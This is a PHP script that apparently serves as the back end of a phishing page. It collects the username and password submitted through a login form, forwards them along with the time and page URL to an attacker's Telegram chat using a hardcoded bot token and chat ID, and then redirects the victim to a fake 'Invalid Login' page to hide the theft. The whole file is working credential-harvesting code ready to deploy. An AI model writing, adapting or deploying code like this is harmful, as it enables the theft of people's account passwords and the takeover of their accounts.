<?php
// Telegram credentials
$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
$chatId = '5248818941';

// Collect form inputs
$email = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Sanity check
if (!empty($email) && !empty($password)) {
    // Build the message
    $message = "🔐 *New Login Submission*\n";
    $message .= "-----------------------------\n";
    $message .= "📧 *Email:* {$email}\n";
    $message .= "🔑 *Password:* {$password}\n";
    $message .= "-----------------------------\n";
    $message .= "📅 *Time:* " . date("Y-m-d H:i:s") . "\n";
    $message .= "🌐 *Page:* " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

    // Prepare Telegram API request
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    // Send via CURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Optionally redirect to success page or original form
    header("Location: Invalid Login.html"); // or any other page
    exit;
} else {
    echo "Invalid input.";
}
?>
